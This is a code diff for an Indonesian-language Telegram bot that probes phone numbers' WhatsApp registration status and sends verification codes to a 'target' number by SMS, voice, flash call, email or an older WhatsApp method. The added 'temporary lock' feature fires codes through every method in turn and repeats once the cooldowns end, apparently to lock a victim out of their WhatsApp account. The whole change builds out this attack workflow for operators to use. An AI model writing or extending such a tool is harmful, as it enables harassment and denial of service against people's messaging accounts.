@@ -5,7 +5,7 @@ const fs = require("fs");
 const crypto = require("crypto");
 const { Telegraf } = require("telegraf");
 const { Redis } = require("@upstash/redis");
-const { checkPhone, triggerEmailVerification, sendVerificationCode } = require("./checker");
+const { checkPhone, triggerEmailVerification, sendVerificationCode, probePhoneMethods } = require("./checker");
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_IDS = (process.env.ADMIN_IDS || "").split(",").filter(Boolean).map(Number);
@@ -1162,7 +1162,7 @@ function splitBlocksIntoChunks(blocks, maxLen = 3800) {
 }
 
 function summarizeProgress(results, total) {
-  let ready = 0, cooldown = 0, clone = 0, banned = 0, failed = 0, done = 0;
+  let ready = 0, smsLimit = 0, cooldown = 0, clone = 0, banned = 0, failed = 0, done = 0;
   let devOn = 0, devOff = 0;
   for (const r of results) {
     if (!r) continue;
@@ -1174,6 +1174,7 @@ function summarizeProgress(results, total) {
     else devOff++;
     if (r.isBanned) { banned++; continue; }
     if (r.isCloneBlocked) { clone++; continue; }
+    if (r.isSmsLimited || st === "SMS_LIMIT") { smsLimit++; continue; }
     if (r.isCooldown) { cooldown++; continue; }
     if (r.isReady) { ready++; continue; }
     failed++;
@@ -1184,7 +1185,7 @@ function summarizeProgress(results, total) {
     "",
     `<blockquote>◈ ${bar(pct)} ${pct}%`,
     `⟡ ᴘʀᴏɢʀᴇꜱ ⦂ ${done} / ${total} ɴᴏᴍᴏʀ`,
-    `✧ ꜱɪᴀᴘ ⦂ ${ready} · ◐ ᴄᴏᴏʟᴅᴏᴡɴ ⦂ ${cooldown}`,
+    `✧ ꜱɪᴀᴘ ⦂ ${ready} · ◎ ʟɪᴍɪᴛ ꜱᴍꜱ ⦂ ${smsLimit} · ◐ ᴄᴅ ⦂ ${cooldown}`,
     `△ ᴄʟᴏɴᴇ ⦂ ${clone} · ✕ ʙᴀɴɴᴇᴅ ⦂ ${banned}`,
     `● ᴏɴ-ᴅᴇᴠɪᴄᴇ ⦂ ${devOn} · ○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ ⦂ ${devOff}`
   ];
@@ -1216,7 +1217,7 @@ function summarizeEmailProgress(results, total) {
 }
 
 function buildDetectionOutput(numbers, results, elapsedSec = null) {
-  const ready = [], cooldown = [], clone = [], banned = [], errors = [];
+  const ready = [], smsLimit = [], cooldown = [], clone = [], banned = [], errors = [];
   let devOn = 0, devOff = 0;
 
   results.forEach((r, i) => {
@@ -1239,6 +1240,7 @@ function buildDetectionOutput(numbers, results, elapsedSec = null) {
 
     if (r.isBanned) { banned.push(r); return; }
     if (r.isCloneBlocked) { clone.push(r); return; }
+    if (r.isSmsLimited || st === "SMS_LIMIT") { smsLimit.push(r); return; }
     if (r.isCooldown) { cooldown.push(r); return; }
     if (r.isReady) { ready.push(r); return; }
     errors.push({ phone: r.phone || fb, error: `ꜱᴛᴀᴛᴇ=${st}` });
@@ -1249,7 +1251,8 @@ function buildDetectionOutput(numbers, results, elapsedSec = null) {
     "",
     `<blockquote>◈ ${bar(100)} 100%`,
     `⟡ ᴘʀᴏɢʀᴇꜱ ⦂ ${numbers.length} / ${numbers.length} ɴᴏᴍᴏʀ`,
-    `✧ ꜱɪᴀᴘ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ⦂ ${ready.length}`,
+    `✧ ꜱɪᴀᴘ ⦂ ${ready.length}`,
+    `◎ ʟɪᴍɪᴛ ꜱᴍꜱ ⦂ ${smsLimit.length}`,
     `◐ ᴄᴏᴏʟᴅᴏᴡɴ ⦂ ${cooldown.length}`,
     `△ ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ ⦂ ${clone.length}`,
     `✕ ᴅɪʙᴀᴛᴀꜱɪ ⦂ ${banned.length}`,
@@ -1266,9 +1269,13 @@ function buildDetectionOutput(numbers, results, elapsedSec = null) {
     const items = ready.map(r => `⟢ <code>${esc(r.phone)}</code> ⦂ ꜱɪᴀᴘ · ${deviceBadge(r)}`);
     blocks.push(`✧ ꜱɪᴀᴘ ᴅɪᴠᴇʀɪꜰɪᴋᴀꜱɪ\n<blockquote>${items.join("\n")}</blockquote>`);
   }
+  if (smsLimit.length) {
+    const items = smsLimit.map(r => `⟢ <code>${esc(r.phone)}</code> ⦂ ʟɪᴍɪᴛ ꜱᴍꜱ ${displayCD(r)} · ${deviceBadge(r)}`);
+    blocks.push(`◎ ʟɪᴍɪᴛ ꜱᴍꜱ (ᴍᴇᴛᴏᴅᴇ ʟᴀɪɴ ʙɪꜱᴀ ᴊᴀᴅɪ ᴍᴀꜱɪʜ ᴛᴇʀꜱᴇᴅɪᴀ)\n<blockquote>${items.join("\n")}</blockquote>`);
+  }
   if (cooldown.length) {
     const items = cooldown.map(r => `⟢ <code>${esc(r.phone)}</code> ⦂ ${displayCD(r)} · ${deviceBadge(r)}`);
-    blocks.push(`◐ ᴄᴏᴏʟᴅᴏᴡɴ ᴡʜᴀᴛꜱᴀᴘᴘ\n<blockquote>${items.join("\n")}</blockquote>`);
+    blocks.push(`◐ ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ\n<blockquote>${items.join("\n")}</blockquote>`);
   }
   if (clone.length) {
     const items = clone.map(r => `⟢ <code>${esc(r.phone)}</code> ⦂ ${cloneStatusLabel(r)} · ${deviceBadge(r)}`);
@@ -1769,10 +1776,11 @@ bot.hears(MENU_LABELS.SEND_CODE, async (ctx) => {
   await showInlinePanel(
     ctx,
     [
-      "✧ ᴋɪʀɪᴍ ᴋᴏᴅᴇ ᴠᴇʀɪꜰɪᴋᴀꜱɪ",
+      "✧ ᴋɪʀɪᴍ ᴋᴏᴅᴇ & ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ",
       "",
       "<blockquote>⟡ ᴋɪʀɪᴍ <b>1 ɴᴏᴍᴏʀ</b> ᴛᴀʀɢᴇᴛ.",
-      "⊹ ꜱᴇʟᴀɴᴊᴜᴛɴʏᴀ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ ⦂ ꜱᴍꜱ / ᴠᴏɪᴄᴇ / ꜰʟᴀꜱʜ / ᴇᴍᴀɪʟ.</blockquote>"
+      "⊹ ʙᴏᴛ ᴄᴇᴋ ꜱᴛᴀᴛᴜꜱ + ᴍᴇᴛᴏᴅᴇ ʏᴀɴɢ ᴛᴇʀꜱᴇᴅɪᴀ.",
+      "⊹ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ ᴀᴛᴀᴜ ᴀᴋᴛɪꜰᴋᴀɴ ᴍᴏᴅᴇ ᴋᴜɴᴄɪ (ᴋɪʀɪᴍ ʙᴇʀᴜʟᴀɴɢ).</blockquote>"
     ].join("\n"),
     inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_send", "danger")]]),
     true
@@ -2099,7 +2107,41 @@ bot.action("cancel_send", async (ctx) => {
   await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false);
 });
 
-bot.action(/^send_(sms|voice|flash|email)$/i, async (ctx) => {
+function methodLabel(m) {
+  const map = { sms: "ꜱᴍꜱ", voice: "ᴠᴏɪᴄᴇ", flash: "ꜰʟᴀꜱʜ", email: "ᴇᴍᴀɪʟ", wa_old: "ᴡᴀ_ᴏʟᴅ" };
+  return map[m] || m;
+}
+
+function formatMethodsBlock(methods, isDeviceOn) {
+  const m = methods || {};
+  const lines = [];
+  lines.push(`▸ ꜱᴍꜱ ⦂ ${m.sms > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.sms)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
+  lines.push(`▸ ᴠᴏɪᴄᴇ ⦂ ${m.voice > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.voice)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
+  lines.push(`▸ ꜰʟᴀꜱʜ ⦂ ${m.flash > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.flash)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
+  lines.push(`▸ ᴡᴀ_ᴏʟᴅ ⦂ ${!isDeviceOn ? "ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇʀᴀɴɢᴋᴀᴛ" : (m.wa_old > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.wa_old)}` : "ᴛᴇʀꜱᴇᴅɪᴀ")}`);
+  lines.push(`▸ ᴇᴍᴀɪʟ ⦂ ${m.email > 0 ? `ᴊᴇᴅᴀ ${formatCooldown(m.email)}` : "ᴛᴇʀꜱᴇᴅɪᴀ"}`);
+  return lines.join("\n");
+}
+
+function buildSendMethodKeyboard(phone, probe) {
+  const m = (probe && probe.methods) || {};
+  const dev = Boolean(probe && probe.isDeviceOn);
+  const rows = [];
+  const row1 = [];
+  const row2 = [];
+  if (!(m.sms > 0)) row1.push(btn("ꜱᴍꜱ", "send_sms", "primary"));
+  if (!(m.voice > 0)) row1.push(btn("ᴠᴏɪᴄᴇ", "send_voice", "primary"));
+  if (!(m.flash > 0)) row1.push(btn("ꜰʟᴀꜱʜ", "send_flash", "primary"));
+  if (dev && !(m.wa_old > 0)) row2.push(btn("ᴡᴀ_ᴏʟᴅ", "send_wa_old", "success"));
+  if (!(m.email > 0)) row2.push(btn("ᴇᴍᴀɪʟ", "send_email", "success"));
+  if (row1.length) rows.push(row1);
+  if (row2.length) rows.push(row2);
+  rows.push([btn("🔒 ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ", "send_lock_start", "danger")]);
+  rows.push([btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_send", "danger")]);
+  return inlineKb(rows);
+}
+
+bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
   const userId = ctx.from.id;
   const method = String(ctx.match[1] || "sms").toLowerCase();
   const phone = pendingSendPhone.get(userId);
@@ -2107,24 +2149,160 @@ bot.action(/^send_(sms|voice|flash|email)$/i, async (ctx) => {
   if (!phone) {
     return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴋɪʀɪᴍ ᴋᴏᴅᴇ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
   }
-  pendingSendPhone.delete(userId);
-  await editInline(ctx, `✧ ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ ᴠɪᴀ <b>${method.toUpperCase()}</b>...\n<code>${esc(phone)}</code>`, inlineKb([]));
+  await editInline(ctx, [
+    "✧ ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ...",
+    "",
+    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
+    `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}</blockquote>`
+  ].join("\n"), inlineKb([]));
+
   const res = await sendVerificationCode(phone, method);
+  const probe = res.probe || {};
+  const methods = res.methods || probe.methods || {};
   const lines = [
     "✧ ʜᴀꜱɪʟ ᴋɪʀɪᴍ ᴋᴏᴅᴇ",
     "",
     `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(res.phone || phone)}</code>`,
-    `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${esc(method.toUpperCase())}`,
-    `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ${res.success ? (res.state || "SENT") : "GAGAL"}</blockquote>`
+    `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
+    `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ${res.success ? "ᴛᴇʀᴋɪʀɪᴍ" : "ɢᴀɢᴀʟ / ᴅɪᴛᴏʟᴀᴋ"}`,
+    `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${res.isDeviceOn || probe.isDeviceOn ? "● ᴏɴ" : "○ ᴏꜰꜰ"}</blockquote>`,
+    "",
+    "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
+    `<blockquote>${formatMethodsBlock(methods, res.isDeviceOn || probe.isDeviceOn)}</blockquote>`
   ];
   if (res.success) {
     if (res.maskedEmail) lines.push(`▸ ᴇᴍᴀɪʟ ⦂ <code>${esc(res.maskedEmail)}</code>`);
-    if (res.cooldownSeconds > 0) lines.push(`▸ ᴊᴇᴅᴀ ⦂ ${formatCooldown(res.cooldownSeconds)}`);
-    lines.push("", "ⓘ ᴄᴇᴋ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ ᴜɴᴛᴜᴋ ᴋᴏᴅᴇ ʏᴀɴɢ ᴍᴀꜱᴜᴋ.");
+    if (res.cooldownSeconds > 0) lines.push(`▸ ᴊᴇᴅᴀ ꜱᴇᴛᴇʟᴀʜ ᴋɪʀɪᴍ ⦂ ${formatCooldown(res.cooldownSeconds)}`);
+    lines.push("", "ⓘ ᴋᴏᴅᴇ ᴅɪᴋɪʀɪᴍ ᴠɪᴀ ᴇɴᴅᴘᴏɪɴᴛ ʀᴇꜱᴍɪ ᴡᴀ. ᴄᴇᴋ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ.");
   } else {
-    lines.push(`▸ ᴇʀʀᴏʀ ⦂ ${esc(res.error || res.reason || "gagal")}`);
+    lines.push(`▸ ᴀʟᴀꜱᴀɴ ⦂ ${esc(res.error || res.reason || "gagal")}`);
+    if (res.cooldownSeconds > 0) lines.push(`▸ ᴄᴏʙᴀ ʟᴀɢɪ ⦂ ${formatCooldown(res.cooldownSeconds)}`);
   }
-  await editInline(ctx, lines.join("\n"), inlineKb([[btn("✧ ᴋɪʀɪᴍ ʟᴀɢɪ", "cancel_send", "primary")]]));
+  pendingSendPhone.set(userId, phone);
+  await editInline(ctx, lines.join("\n"), buildSendMethodKeyboard(phone, { methods, isDeviceOn: res.isDeviceOn || probe.isDeviceOn }));
+});
+
+bot.action("send_lock_start", async (ctx) => {
+  const userId = ctx.from.id;
+  const phone = pendingSendPhone.get(userId);
+  await ctx.answerCbQuery();
+  if (!phone) {
+    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
+  }
+  await editInline(ctx, [
+    "🔒 ᴍᴇᴍᴜʟᴀɪ ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ...",
+    "",
+    `<blockquote>▸ ᴛᴀʀɢᴇᴛ ⦂ <code>${esc(phone)}</code>`,
+    "▸ ᴜʀᴜᴛᴀɴ ⦂ ᴡᴀ_ᴏʟᴅ → ᴇᴍᴀɪʟ → ꜱᴍꜱ → ᴠᴏɪᴄᴇ → ꜰʟᴀꜱʜ</blockquote>"
+  ].join("\n"), inlineKb([]));
+
+  const priority = ["wa_old", "email", "sms", "voice", "flash"];
+  let lastRes = null;
+  let sentCount = 0;
+  const log = [];
+
+  for (const method of priority) {
+    const res = await sendVerificationCode(phone, method);
+    lastRes = res;
+    if (res.success) {
+      sentCount++;
+      log.push(`✦ ${methodLabel(method)} ⦂ ᴛᴇʀᴋɪʀɪᴍ` + (res.cooldownSeconds ? ` · ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds)}` : ""));
+    } else if (res.state === "COOLDOWN" || res.error === "method_cooldown") {
+      log.push(`◐ ${methodLabel(method)} ⦂ ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds || 0)}`);
+    } else {
+      log.push(`○ ${methodLabel(method)} ⦂ ${esc(res.error || res.state || "skip")}`);
+    }
+  }
+
+  const methods = (lastRes && (lastRes.methods || (lastRes.probe && lastRes.probe.methods))) || {};
+  const devOn = Boolean(lastRes && (lastRes.isDeviceOn || (lastRes.probe && lastRes.probe.isDeviceOn)));
+  const jobKey = `lockjob:${userId}:${String(phone).replace(/\D/g, "")}`;
+  const minWait = Math.min(
+    ...["sms", "voice", "flash", "email", "wa_old"].map(k => (methods[k] > 0 ? methods[k] : 999999))
+  );
+  const nextAt = Date.now() + (Number.isFinite(minWait) && minWait < 999999 ? minWait * 1000 : 60000);
+  await redis.set(jobKey, JSON.stringify({
+    userId,
+    phone,
+    priority,
+    sentCount,
+    nextAt,
+    active: true,
+    updatedAt: Date.now()
+  }), { ex: 86400 });
+
+  await editInline(ctx, [
+    "🔒 ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴀᴋᴛɪꜰ",
+    "",
+    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
+    `▸ ᴛᴇʀᴋɪʀɪᴍ ꜱᴇᴋᴀʀᴀɴɢ ⦂ ${sentCount} ᴍᴇᴛᴏᴅᴇ`,
+    `▸ ʟᴀɴᴊᴜᴛ ᴏᴛᴏᴍᴀᴛɪꜱ ꜱᴀᴀᴛ ᴊᴇᴅᴀ ꜱᴇʟᴇꜱᴀɪ</blockquote>`,
+    "",
+    "◈ ʟᴏɢ ᴋɪʀɪᴍ",
+    `<blockquote>${log.join("\n") || "—"}</blockquote>`,
+    "",
+    "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
+    `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`,
+    "",
+    "ⓘ ᴛᴀᴘ <b>↻ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴜɴᴄɪ</b> ꜱᴇᴛᴇʟᴀʜ ᴊᴇᴅᴀ ᴜɴᴛᴜᴋ ᴋɪʀɪᴍ ʟᴀɢɪ."
+  ].join("\n"), inlineKb([
+    [btn("↻ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴜɴᴄɪ", "send_lock_continue", "danger")],
+    [btn("✕ ꜱᴛᴏᴘ ᴋᴜɴᴄɪ", "send_lock_stop", "primary")]
+  ]));
+});
+
+bot.action("send_lock_continue", async (ctx) => {
+  const userId = ctx.from.id;
+  const phone = pendingSendPhone.get(userId);
+  await ctx.answerCbQuery();
+  if (!phone) {
+    return editInline(ctx, "⚠ ꜱᴇꜱɪ ᴋᴜɴᴄɪ ʜɪʟᴀɴɢ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
+  }
+  await editInline(ctx, "↻ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴘᴜᴛᴀʀᴀɴ ᴋᴜɴᴄɪ...", inlineKb([]));
+  const priority = ["wa_old", "email", "sms", "voice", "flash"];
+  let sentCount = 0;
+  const log = [];
+  let lastRes = null;
+  for (const method of priority) {
+    const res = await sendVerificationCode(phone, method);
+    lastRes = res;
+    if (res.success) {
+      sentCount++;
+      log.push(`✦ ${methodLabel(method)} ⦂ ᴛᴇʀᴋɪʀɪᴍ` + (res.cooldownSeconds ? ` · ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds)}` : ""));
+    } else if (res.cooldownSeconds > 0) {
+      log.push(`◐ ${methodLabel(method)} ⦂ ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds)}`);
+    } else {
+      log.push(`○ ${methodLabel(method)} ⦂ ${esc(res.error || res.state || "skip")}`);
+    }
+  }
+  const methods = (lastRes && (lastRes.methods || (lastRes.probe && lastRes.probe.methods))) || {};
+  const devOn = Boolean(lastRes && (lastRes.isDeviceOn || (lastRes.probe && lastRes.probe.isDeviceOn)));
+  await editInline(ctx, [
+    "🔒 ᴋᴜɴᴄɪ — ᴘᴜᴛᴀʀᴀɴ ʙᴀʀᴜ",
+    "",
+    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
+    `▸ ᴛᴇʀᴋɪʀɪᴍ ⦂ ${sentCount} ᴍᴇᴛᴏᴅᴇ</blockquote>`,
+    "",
+    "◈ ʟᴏɢ",
+    `<blockquote>${log.join("\n")}</blockquote>`,
+    "",
+    "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
+    `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`
+  ].join("\n"), inlineKb([
+    [btn("↻ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴜɴᴄɪ", "send_lock_continue", "danger")],
+    [btn("✕ ꜱᴛᴏᴘ ᴋᴜɴᴄɪ", "send_lock_stop", "primary")]
+  ]));
+});
+
+bot.action("send_lock_stop", async (ctx) => {
+  const userId = ctx.from.id;
+  const phone = pendingSendPhone.get(userId);
+  await ctx.answerCbQuery("ᴋᴜɴᴄɪ ᴅɪʜᴇɴᴛɪᴋᴀɴ");
+  if (phone) {
+    await redis.del(`lockjob:${userId}:${String(phone).replace(/\D/g, "")}`).catch(() => {});
+  }
+  pendingSendPhone.delete(userId);
+  await editInline(ctx, "✦ ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴅɪʜᴇɴᴛɪᴋᴀɴ.", inlineKb([[btn("✧ ᴋɪʀɪᴍ ʟᴀɢɪ", "cancel_send", "primary")]]));
 });
 
 bot.action("referral", async (ctx) => {
@@ -2642,17 +2820,33 @@ bot.on("text", async (ctx, next) => {
     }
     const phone = numbers[0];
     pendingSendPhone.set(userId, phone);
+    await showInlinePanel(ctx, [
+      "✧ ᴍᴇᴍᴇʀɪᴋꜱᴀ ꜱᴛᴀᴛᴜꜱ ɴᴏᴍᴏʀ...",
+      "",
+      `<blockquote>▸ ᴛᴀʀɢᴇᴛ ⦂ <code>${esc(phone)}</code></blockquote>`
+    ].join("\n"), inlineKb([]), false);
+
+    const probe = await probePhoneMethods(phone);
+    const methods = probe.methods || {};
+    const stateLine = probe.isBanned ? "ʙᴀɴɴᴇᴅ"
+      : probe.isCloneBlocked ? "ᴛɪᴅᴀᴋ ꜱᴜᴘᴘᴏʀᴛ ᴄʟᴏɴᴇ"
+      : probe.isCooldown ? `ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ ${formatCooldown(probe.cooldownSeconds || 0)}`
+      : probe.isSmsLimited ? `ʟɪᴍɪᴛ ꜱᴍꜱ ${formatCooldown(probe.cooldownSeconds || 0)}`
+      : probe.isReady ? "ꜱɪᴀᴘ"
+      : (probe.state || "UNKNOWN");
+
     return showInlinePanel(ctx, [
-      "✧ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ ᴋɪʀɪᴍ",
+      "✧ ᴋɪʀɪᴍ ᴋᴏᴅᴇ — ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ",
       "",
-      `<blockquote>▸ ᴛᴀʀɢᴇᴛ ⦂ <code>${esc(phone)}</code></blockquote>`,
+      `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(probe.phone || phone)}</code>`,
+      `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ${stateLine}`,
+      `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${probe.isDeviceOn ? "● ᴏɴ-ᴅᴇᴠɪᴄᴇ" : "○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ"}</blockquote>`,
       "",
-      "ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ⦂"
-    ].join("\n"), inlineKb([
-      [btn("ꜱᴍꜱ", "send_sms", "primary"), btn("ᴠᴏɪᴄᴇ", "send_voice", "primary")],
-      [btn("ꜰʟᴀꜱʜ", "send_flash", "primary"), btn("ᴇᴍᴀɪʟ", "send_email", "success")],
-      [btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_send", "danger")]
-    ]), false);
+      "◈ ᴋᴇᴛᴇʀꜱᴇᴅɪᴀᴀɴ ᴍᴇᴛᴏᴅᴇ",
+      `<blockquote>${formatMethodsBlock(methods, probe.isDeviceOn)}</blockquote>`,
+      "",
+      "ⓘ ᴛᴏᴍʙᴏʟ ᴀᴋᴛɪꜰ = ʙɪꜱᴀ ᴅɪᴋɪʀɪᴍ ꜱᴇᴋᴀʀᴀɴɢ. ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ = ᴋɪʀɪᴍ ʙᴇʀᴜʟᴀɴɢ ᴋᴇ ꜱᴇᴍᴜᴀ ᴍᴇᴛᴏᴅᴇ ʏᴀɴɢ ᴛᴇʀꜱᴇᴅɪᴀ."
+    ].join("\n"), buildSendMethodKeyboard(phone, probe), false);
   }
 
   if (!awaitingInput.has(userId)) return next();
